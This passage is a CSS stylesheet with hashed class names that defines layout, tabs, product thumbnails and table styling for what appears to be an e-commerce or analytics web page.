    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK ._37zCllIZivlh94zwsDOb4q {
        display: flex;
        align-items: center;
        margin-bottom: 24px;
        position: sticky;
        top: 0;
        background-color: #fff;
        border-bottom: solid 1px #f5f5f5
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK ._37zCllIZivlh94zwsDOb4q .kyKZu9xaEHfy2kDxCmbQf {
        position: relative;
        padding: 10px 0;
        cursor: pointer;
        line-height: 16px;
        font-size: 14px;
        margin-right: 24px
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK ._37zCllIZivlh94zwsDOb4q .kyKZu9xaEHfy2kDxCmbQf:before,
    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK ._37zCllIZivlh94zwsDOb4q .kyKZu9xaEHfy2kDxCmbQf:after {
        content: '';
        position: absolute;
        width: 0;
        border-bottom: solid 2px var(--ah-red-100);
        bottom: -1px;
        transition: 0.15s
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK ._37zCllIZivlh94zwsDOb4q .kyKZu9xaEHfy2kDxCmbQf:before {
        left: 50%
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK ._37zCllIZivlh94zwsDOb4q .kyKZu9xaEHfy2kDxCmbQf:after {
        right: 50%
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK ._37zCllIZivlh94zwsDOb4q ._22G09-gs11UprQodikRK9c {
        color: var(--ah-red-100)
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK ._37zCllIZivlh94zwsDOb4q ._22G09-gs11UprQodikRK9c:before,
    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK ._37zCllIZivlh94zwsDOb4q ._22G09-gs11UprQodikRK9c:after {
        content: '';
        width: 50%
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK ._1XvDi7cPfeuq4lvGQzQqda {
        font-size: 18px;
        font-weight: 700;
        color: #000;
        margin: 20px 0 16px
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK .t3kN611aWMGZDMW2Ie4d5 ._5qCS64flwo0ottu7H72fr {
        display: flex;
        align-items: center;
        border-bottom: 1px solid #d9d9d9;
        padding: 0 6px;
        margin-top: 20px
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK .t3kN611aWMGZDMW2Ie4d5 ._5qCS64flwo0ottu7H72fr span {
        display: inline-flex;
        font-size: 14px;
        font-weight: 600;
        color: #262626;
        padding-bottom: 10px;
        position: relative;
        cursor: pointer
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK .t3kN611aWMGZDMW2Ie4d5 ._5qCS64flwo0ottu7H72fr span+span {
        margin-left: 40px
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK .t3kN611aWMGZDMW2Ie4d5 ._5qCS64flwo0ottu7H72fr span.lvotgAM5IElhuolhgvY-R {
        color: #e9162b
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK .t3kN611aWMGZDMW2Ie4d5 ._5qCS64flwo0ottu7H72fr span.lvotgAM5IElhuolhgvY-R:before {
        content: ' ';
        display: block;
        width: 100%;
        height: 2px;
        background: #e9162b;
        position: absolute;
        left: 0;
        bottom: -2px
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK .t3kN611aWMGZDMW2Ie4d5 .uKfn7z67LPPdwBAIzjIws {
        margin-top: 20px
    }

    ._3NDsJBNqjKrTOni1wSJuDZ._2-VkjzCvIxbjcCJLiZjFWK .t3kN611aWMGZDMW2Ie4d5 ._3mIKtFIoE77BgOt14B9MmH {
        font-size: 20px;
        font-weight: 700
    }

    ._2imFL2TMUeat3Hl58WGOXM._3Z4hwqi1h7T3dTyv1_RrWJ {
        padding: 0px 20px
    }

    ._2imFL2TMUeat3Hl58WGOXM._3Z4hwqi1h7T3dTyv1_RrWJ .BYaqzZWq9bc0SqKqKNinT {
        box-shadow: 0px 1px 8px rgba(0, 0, 0, 0.08);
        margin-left: -20px;
        margin-right: -20px;
        padding-left: 20px;
        padding-right: 20px;
        padding-bottom: 12px;
        position: relative;
        display: flex;
        justify-content: space-between
    }

    ._2imFL2TMUeat3Hl58WGOXM._3Z4hwqi1h7T3dTyv1_RrWJ .BYaqzZWq9bc0SqKqKNinT ._3jNvSTbZ6yEJNrBtG2fwxN {
        display: inline-flex;
        align-items: center
    }

    ._2imFL2TMUeat3Hl58WGOXM._3Z4hwqi1h7T3dTyv1_RrWJ .BYaqzZWq9bc0SqKqKNinT ._3jNvSTbZ6yEJNrBtG2fwxN .xY-810irqyC25DpRwsqMo {
        font-size: 20px;
        font-weight: 700;
        line-height: 38px;
        color: #000
    }

    ._2imFL2TMUeat3Hl58WGOXM._3Z4hwqi1h7T3dTyv1_RrWJ .BYaqzZWq9bc0SqKqKNinT:after {
        content: '';
        display: block;
        width: calc(100% + 40px);
        position: absolute;
        bottom: 0;
        left: -20px
    }

    ._2imFL2TMUeat3Hl58WGOXM._3Z4hwqi1h7T3dTyv1_RrWJ ._1S4mwzFXf3tRO7ki-hseTu {
        position: relative;
        padding: 20px 0
    }

    ._2imFL2TMUeat3Hl58WGOXM._3Z4hwqi1h7T3dTyv1_RrWJ ._1S4mwzFXf3tRO7ki-hseTu ._2J8fP7qTSk0vSRjn8AFWhF {
        position: absolute;
        top: 0;
        left: -20px;
        right: -20px;
        bottom: 0;
        z-index: 10
    }

    ._2imFL2TMUeat3Hl58WGOXM._3Z4hwqi1h7T3dTyv1_RrWJ ._2402O02mZdEjIkI1V9K_qd {
        display: grid;
        grid-template-columns: 1fr 170px;
        column-gap: 40px
    }

    ._2imFL2TMUeat3Hl58WGOXM._3Z4hwqi1h7T3dTyv1_RrWJ ._1wFSPV05yXzEf5GMLksz9H ._3bealAF2LDeYTZuoWX1HRW {
        display: grid;
        grid-template-columns: 160px 1fr
    }

    ._2imFL2TMUeat3Hl58WGOXM._3Z4hwqi1h7T3dTyv1_RrWJ ._1wFSPV05yXzEf5GMLksz9H ._3bealAF2LDeYTZuoWX1HRW ._35-9rFvzjAsPOKk_15REr3 {
        border-radius: 4px;
        overflow: hidden;
        width: 160px;
        height: 160px
    }

    ._2imFL2TMUeat3Hl58WGOXM._3Z4hwqi1h7T3dTyv1_RrWJ ._1wFSPV05yXzEf5GMLksz9H ._3bealAF2LDeYTZuoWX1HRW ._35-9rFvzjAsPOKk_15REr3 img {
        width: 100%;
        max-width: 160px;
        display: flex
    }

    ._2imFL2TMUeat3Hl58WGOXM._3Z4hwqi1h7T3dTyv1_RrWJ ._1wFSPV05yXzEf5GMLksz9H ._3bealAF2LDeYTZuoWX1HRW ._3kFrrYtHHLl-Z5P47XvqTH {
        padding-left: 32px
    }

    ._2imFL2TMUeat3Hl58WGOXM._3Z4hwqi1h7T3dTyv1_RrWJ ._1wFSPV05yXzEf5GMLksz9H ._3bealAF2LDeYTZuoWX1HRW ._3kFrrYtHHLl-Z5P47XvqTH ._1v2ZSSawWR5zIIH84AJlTT {
        display: -webkit-box;
        -webkit-box-orient: vertical;
        -webkit-line-clamp: 2;
        line-height: 22px;
        overflow: hidden
    }

    ._2imFL2TMUeat3Hl58WGOXM._3Z4hwqi1h7T3dTyv1_RrWJ ._1wFSPV05yXzEf5GMLksz9H ._3bealAF2LDeYTZuoWX1HRW ._3kFrrYtHHLl-Z5P47XvqTH ._2EA7KfDMnOTW151lHs5jr8 {
        display: flex;
        align-items: center;
        margin-top: 5px
    }

    ._2imFL2TMUeat3Hl58WGOXM._3Z4hwqi1h7T3dTyv1_RrWJ ._1wFSPV05yXzEf5GMLksz9H ._3bealAF2LDeYTZuoWX1HRW ._3kFrrYtHHLl-Z5P47XvqTH ._2EA7KfDMnOTW151lHs5jr8 span {
        display: inline-flex
    }

    ._2imFL2TMUeat3Hl58WGOXM._3Z4hwqi1h7T3dTyv1_RrWJ ._1wFSPV05yXzEf5GMLksz9H ._3bealAF2LDeYTZuoWX1HRW ._3kFrrYtHHLl-Z5P47XvqTH .u3-rBtuLQZssAQbYB2CWY {
        margin-top: 10px
    }

    ._2imFL2TMUeat3Hl58WGOXM._3Z4hwqi1h7T3dTyv1_RrWJ ._1wFSPV05yXzEf5GMLksz9H ._3m8aczeQkDw4aRBxCflTUN {
        margin-top: 4px;
        display: grid;
        grid-template-columns: 120px 1fr
    }

    ._2imFL2TMUeat3Hl58WGOXM._3Z4hwqi1h7T3dTyv1_RrWJ ._1wFSPV05yXzEf5GMLksz9H ._2SgncoDtBMkPC8YuKMIpEz {
        display: grid;
        grid-template-columns: 210px 210px 1fr
    }

    ._2imFL2TMUeat3Hl58WGOXM._3Z4hwqi1h7T3dTyv1_RrWJ ._278io0fOyiLayL5jox8_Sp {
        margin-left: 16px;
        padding: 5px 12px 12px;
        background: #ffffff;
        border: 1px solid #d9d9d9;
        border-radius: 4px
    }

    ._2imFL2TMUeat3Hl58WGOXM._3Z4hwqi1h7T3dTyv1_RrWJ ._3jxqOGIfu8e9IsUYjHG5Jv {
        padding-top: 32px
    }

    ._2imFL2TMUeat3Hl58WGOXM._3Z4hwqi1h7T3dTyv1_RrWJ ._3jxqOGIfu8e9IsUYjHG5Jv ._22bmkkk85tHOIjt0zEJZJQ {
        font-size: 20px;
        font-weight: 700;
        color: var(--ah-black-100)
    }

    ._2imFL2TMUeat3Hl58WGOXM._3Z4hwqi1h7T3dTyv1_RrWJ ._3jxqOGIfu8e9IsUYjHG5Jv .HUXj5HxwmkIzvAYaqfoqF {
        display: flex;
        align-items: center;
        border-bottom: 1px solid #d9d9d9;
        padding: 0 6px;
        margin-top: 20px
    }

    ._2imFL2TMUeat3Hl58WGOXM._3Z4hwqi1h7T3dTyv1_RrWJ ._3jxqOGIfu8e9IsUYjHG5Jv .HUXj5HxwmkIzvAYaqfoqF span {
        display: inline-flex;
        font-size: 14px;
        font-weight: 600;
        color: #262626;
        padding-bottom: 10px;
        position: relative;
        cursor: pointer
    }

    ._2imFL2TMUeat3Hl58WGOXM._3Z4hwqi1h7T3dTyv1_RrWJ ._3jxqOGIfu8e9IsUYjHG5Jv .HUXj5HxwmkIzvAYaqfoqF span+span {
        margin-left: 40px
    }

    ._2imFL2TMUeat3Hl58WGOXM._3Z4hwqi1h7T3dTyv1_RrWJ ._3jxqOGIfu8e9IsUYjHG5Jv .HUXj5HxwmkIzvAYaqfoqF span._12OTsYAA-gf6CjCAVWaeGh {
        color: #e9162b
    }

    ._2imFL2TMUeat3Hl58WGOXM._3Z4hwqi1h7T3dTyv1_RrWJ ._3jxqOGIfu8e9IsUYjHG5Jv .HUXj5HxwmkIzvAYaqfoqF span._12OTsYAA-gf6CjCAVWaeGh:before {
        content: ' ';
        display: block;
        width: 100%;
        height: 2px;
        background: #e9162b;
        position: absolute;
        left: 0;
        bottom: -2px
    }

    ._2imFL2TMUeat3Hl58WGOXM._3Z4hwqi1h7T3dTyv1_RrWJ .JVN2HJ5eYEYzRtKtQKAAM {
        margin-top: 30px
    }

    ._2imFL2TMUeat3Hl58WGOXM._3Z4hwqi1h7T3dTyv1_RrWJ ._2LG-HWE7YrbP3X1I4JyyGN svg,
    ._2imFL2TMUeat3Hl58WGOXM._3Z4hwqi1h7T3dTyv1_RrWJ ._2LG-HWE7YrbP3X1I4JyyGN path {
        fill: #0a5cd1
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk {
        padding: 0px 20px
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk ._100xanm9L5cSwwTSH8QXlD {
        padding-bottom: 12px;
        position: relative;
        display: flex;
        justify-content: space-between
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk ._100xanm9L5cSwwTSH8QXlD ._1qegBFyScIgUJVm0O7bqYG {
        display: inline-flex;
        align-items: center
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk ._100xanm9L5cSwwTSH8QXlD ._1qegBFyScIgUJVm0O7bqYG ._1zIPz6KJKNxGTMUp714J29 {
        font-size: 20px;
        font-weight: 700;
        line-height: 38px;
        color: #000
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk ._100xanm9L5cSwwTSH8QXlD:after {
        content: '';
        display: block;
        width: calc(100% + 40px);
        position: absolute;
        bottom: 0;
        left: -20px;
        border-bottom: 1px solid #e2e4e5
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk ._1wzy7oha3jtLdpNBBMB9G6 {
        position: relative
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk ._1wzy7oha3jtLdpNBBMB9G6 ._1ef0PM79k_gGsAlNw2koyS {
        position: absolute;
        top: 0;
        left: -20px;
        right: -20px;
        bottom: 0;
        border-radius: 0 0 6px 6px;
        overflow: hidden;
        z-index: 999999
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk ._7-m1jNpS7qHqBtCaHMzGS {
        position: sticky;
        top: 0;
        padding-top: 20px;
        display: grid;
        grid-template-columns: 0.75fr 70px 1fr;
        padding-bottom: 10px;
        background: #fff;
        border-bottom: 1px solid #e2e4e5;
        z-index: 1000
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk ._7-m1jNpS7qHqBtCaHMzGS ._3cJcWZu1RED71OYo12wvep {
        display: grid;
        grid-template-columns: 68px 1fr
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk ._7-m1jNpS7qHqBtCaHMzGS ._3cJcWZu1RED71OYo12wvep ._2rdliAP_yZwtdv3ycaIYfa {
        width: 68px;
        height: 68px;
        margin-right: 10px;
        display: flex;
        border-radius: 4px;
        overflow: hidden
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk ._7-m1jNpS7qHqBtCaHMzGS ._3cJcWZu1RED71OYo12wvep ._2rdliAP_yZwtdv3ycaIYfa img {
        max-width: 100%;
        width: 100%
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk ._7-m1jNpS7qHqBtCaHMzGS ._3cJcWZu1RED71OYo12wvep ._2HQdLExH29loNe7HwAD2jl {
        padding-left: 10px
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk ._7-m1jNpS7qHqBtCaHMzGS ._3cJcWZu1RED71OYo12wvep ._2HQdLExH29loNe7HwAD2jl ._37mY5QhsMtqd2XDcSgzGG7 {
        display: -webkit-box;
        -webkit-box-orient: vertical;
        -webkit-line-clamp: 2;
        overflow: hidden;
        text-overflow: ellipsis
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk ._7-m1jNpS7qHqBtCaHMzGS ._3cJcWZu1RED71OYo12wvep ._2HQdLExH29loNe7HwAD2jl ._37mY5QhsMtqd2XDcSgzGG7:hover {
        color: var(--ah-primary-hover)
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk ._7-m1jNpS7qHqBtCaHMzGS ._3cJcWZu1RED71OYo12wvep ._2HQdLExH29loNe7HwAD2jl ._37KMaWTcfYc-pSueKEANqF {
        display: flex;
        align-items: center;
        margin-top: 5px
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk ._7-m1jNpS7qHqBtCaHMzGS ._3cJcWZu1RED71OYo12wvep ._2HQdLExH29loNe7HwAD2jl ._37KMaWTcfYc-pSueKEANqF span {
        display: inline-flex
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk ._7-m1jNpS7qHqBtCaHMzGS ._17WNHPgnKdqAYM8S9czf4g {
        display: grid;
        grid-template-columns: 100px 100px 100px
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk ._7-m1jNpS7qHqBtCaHMzGS ._17WNHPgnKdqAYM8S9czf4g ._1bdfHYPKDbQsOa9MvI_4IF {
        color: #2e2e2e
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk ._7-m1jNpS7qHqBtCaHMzGS ._17WNHPgnKdqAYM8S9czf4g ._2ecmTmy4f0VqRfF99lz2FE {
        font-size: 14px;
        font-weight: 700;
        color: #2e2e2e
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .G4flzdyGMKkwxNJ5FrTBh {
        position: relative;
        padding-top: 20px
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 {
        display: table;
        width: 100%
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._2a-O3EDCN6QNejb9-WSNN7 {
        display: table-header-group
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._2a-O3EDCN6QNejb9-WSNN7 .BGDUyScZQNnH8ucqiTIa9 {
        display: table-row
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._2a-O3EDCN6QNejb9-WSNN7 .BGDUyScZQNnH8ucqiTIa9 ._2GFNHCOiRkgZXYPQLU9GQO {
        display: table-cell;
        padding: 13px 10px;
        background: #e9e9e9;
        font-weight: 500
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._2a-O3EDCN6QNejb9-WSNN7 .BGDUyScZQNnH8ucqiTIa9 ._2GFNHCOiRkgZXYPQLU9GQO._2vuClwgJB-dgt7iUBOjb-v {
        width: 40%
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._2a-O3EDCN6QNejb9-WSNN7 .BGDUyScZQNnH8ucqiTIa9 ._2GFNHCOiRkgZXYPQLU9GQO._2jJ2Mq5Fg35WmPErVaC__U {
        width: 15%
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._2a-O3EDCN6QNejb9-WSNN7 .BGDUyScZQNnH8ucqiTIa9 ._2GFNHCOiRkgZXYPQLU9GQO._1wLlEAKzxcX8e3lsV4fKp7 {
        width: 15%
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._2a-O3EDCN6QNejb9-WSNN7 .BGDUyScZQNnH8ucqiTIa9 ._2GFNHCOiRkgZXYPQLU9GQO._13Ki5XJ_QSQ7zdGoMI_ht {
        width: 15%
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._2a-O3EDCN6QNejb9-WSNN7 .BGDUyScZQNnH8ucqiTIa9 ._2GFNHCOiRkgZXYPQLU9GQO._1hNWfKob6hGL9KULOUGsb8 {
        width: 15%
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._2a-O3EDCN6QNejb9-WSNN7 .BGDUyScZQNnH8ucqiTIa9 ._2GFNHCOiRkgZXYPQLU9GQO:first-child {
        border-top-left-radius: 4px;
        border-bottom-left-radius: 4px
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._2a-O3EDCN6QNejb9-WSNN7 .BGDUyScZQNnH8ucqiTIa9 ._2GFNHCOiRkgZXYPQLU9GQO:last-child {
        border-top-right-radius: 4px;
        border-bottom-right-radius: 4px
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._3WrVoB27LPAv7BDIoyQgJH {
        display: table-header-group
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._3WrVoB27LPAv7BDIoyQgJH .BGDUyScZQNnH8ucqiTIa9 {
        display: table-row
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._3WrVoB27LPAv7BDIoyQgJH .BGDUyScZQNnH8ucqiTIa9 ._1xvtsR7eDZWfRlx5AW-vdS {
        display: table-cell;
        padding: 14px 10px;
        text-align: left;
        vertical-align: middle;
        border-bottom: 1px solid #e2e4e5
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._3WrVoB27LPAv7BDIoyQgJH .BGDUyScZQNnH8ucqiTIa9 ._1xvtsR7eDZWfRlx5AW-vdS._2VvpG0E96tV3Ou-J8H0Xd7 * {
        cursor: pointer
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._3WrVoB27LPAv7BDIoyQgJH .BGDUyScZQNnH8ucqiTIa9 ._1xvtsR7eDZWfRlx5AW-vdS ._1S1AnFz4sMgOoMjD-7QhHn {
        width: 60px;
        height: 60px;
        border-radius: 4px
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._3WrVoB27LPAv7BDIoyQgJH .BGDUyScZQNnH8ucqiTIa9 ._1xvtsR7eDZWfRlx5AW-vdS ._37mY5QhsMtqd2XDcSgzGG7 {
        max-width: 280px;
        display: -webkit-box;
        -webkit-line-clamp: 2;
        -webkit-box-orient: vertical;
        overflow: hidden;
        min-height: 24px;
        margin-left: 16px
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._3WrVoB27LPAv7BDIoyQgJH .BGDUyScZQNnH8ucqiTIa9 ._1xvtsR7eDZWfRlx5AW-vdS ._37mY5QhsMtqd2XDcSgzGG7:hover {
        color: var(--ah-primary-hover)
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._3WrVoB27LPAv7BDIoyQgJH .BGDUyScZQNnH8ucqiTIa9 ._1xvtsR7eDZWfRlx5AW-vdS ._2MGyBzDiBju3VHpfp--s_N {
        position: absolute;
        top: 0;
        right: 0;
        left: 0;
        bottom: 0;
        border-radius: 4px;
        background-color: rgba(0, 0, 0, 0.7);
        display: flex;
        align-items: center;
        justify-content: center
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._3WrVoB27LPAv7BDIoyQgJH .BGDUyScZQNnH8ucqiTIa9 ._1xvtsR7eDZWfRlx5AW-vdS.LCxKfV1gMKeuXcI0S-Y9e>span {
        display: flex;
        align-items: center
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._3WrVoB27LPAv7BDIoyQgJH .BGDUyScZQNnH8ucqiTIa9 ._1xvtsR7eDZWfRlx5AW-vdS.LCxKfV1gMKeuXcI0S-Y9e>span span {
        display: inline-flex;
        margin-right: 5px
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._3WrVoB27LPAv7BDIoyQgJH .BGDUyScZQNnH8ucqiTIa9 ._1xvtsR7eDZWfRlx5AW-vdS ._1FyITxFOc2Tdy6UGc4ppQP,
    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._3WrVoB27LPAv7BDIoyQgJH .BGDUyScZQNnH8ucqiTIa9 ._1xvtsR7eDZWfRlx5AW-vdS .xdZhRP1p_cefHSvBzPNOd {
        color: #21a67a;
        display: flex;
        align-items: center
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._3WrVoB27LPAv7BDIoyQgJH .BGDUyScZQNnH8ucqiTIa9 ._1xvtsR7eDZWfRlx5AW-vdS ._1FyITxFOc2Tdy6UGc4ppQP svg,
    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._3WrVoB27LPAv7BDIoyQgJH .BGDUyScZQNnH8ucqiTIa9 ._1xvtsR7eDZWfRlx5AW-vdS .xdZhRP1p_cefHSvBzPNOd svg {
        margin-left: 5px;
        width: 8px !important
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._3WrVoB27LPAv7BDIoyQgJH .BGDUyScZQNnH8ucqiTIa9 ._1xvtsR7eDZWfRlx5AW-vdS ._1FyITxFOc2Tdy6UGc4ppQP svg,
    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._3WrVoB27LPAv7BDIoyQgJH .BGDUyScZQNnH8ucqiTIa9 ._1xvtsR7eDZWfRlx5AW-vdS ._1FyITxFOc2Tdy6UGc4ppQP path,
    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._3WrVoB27LPAv7BDIoyQgJH .BGDUyScZQNnH8ucqiTIa9 ._1xvtsR7eDZWfRlx5AW-vdS .xdZhRP1p_cefHSvBzPNOd svg,
    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._3WrVoB27LPAv7BDIoyQgJH .BGDUyScZQNnH8ucqiTIa9 ._1xvtsR7eDZWfRlx5AW-vdS .xdZhRP1p_cefHSvBzPNOd path {
        fill: #21a67a
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._3WrVoB27LPAv7BDIoyQgJH .BGDUyScZQNnH8ucqiTIa9 ._1xvtsR7eDZWfRlx5AW-vdS ._3qMEt83IhrsDhe-86hvjX6,
    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._3WrVoB27LPAv7BDIoyQgJH .BGDUyScZQNnH8ucqiTIa9 ._1xvtsR7eDZWfRlx5AW-vdS ._3pkcU77G6iQTxKba-Eo6lD {
        color: #e9162b;
        display: flex;
        align-items: center
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._3WrVoB27LPAv7BDIoyQgJH .BGDUyScZQNnH8ucqiTIa9 ._1xvtsR7eDZWfRlx5AW-vdS ._3qMEt83IhrsDhe-86hvjX6 svg,
    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._3WrVoB27LPAv7BDIoyQgJH .BGDUyScZQNnH8ucqiTIa9 ._1xvtsR7eDZWfRlx5AW-vdS ._3pkcU77G6iQTxKba-Eo6lD svg {
        margin-left: 5px;
        width: 8px !important
    }

    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._3WrVoB27LPAv7BDIoyQgJH .BGDUyScZQNnH8ucqiTIa9 ._1xvtsR7eDZWfRlx5AW-vdS ._3qMEt83IhrsDhe-86hvjX6 svg,
    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._3WrVoB27LPAv7BDIoyQgJH .BGDUyScZQNnH8ucqiTIa9 ._1xvtsR7eDZWfRlx5AW-vdS ._3qMEt83IhrsDhe-86hvjX6 path,
    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._3WrVoB27LPAv7BDIoyQgJH .BGDUyScZQNnH8ucqiTIa9 ._1xvtsR7eDZWfRlx5AW-vdS ._3pkcU77G6iQTxKba-Eo6lD svg,
    .PUNMu_Idx5XFZTKzSevjL._3f0kSlCdWNbCNYbl8QfCUk .YQm-9XbnxLXLZLJB7dPX2 ._3WrVoB27LPAv7BDIoyQgJH .BGDUyScZQNnH8ucqiTIa9 ._1xvtsR7eDZWfRlx5AW-vdS ._3pkcU77G6iQTxKba-Eo6lD path {
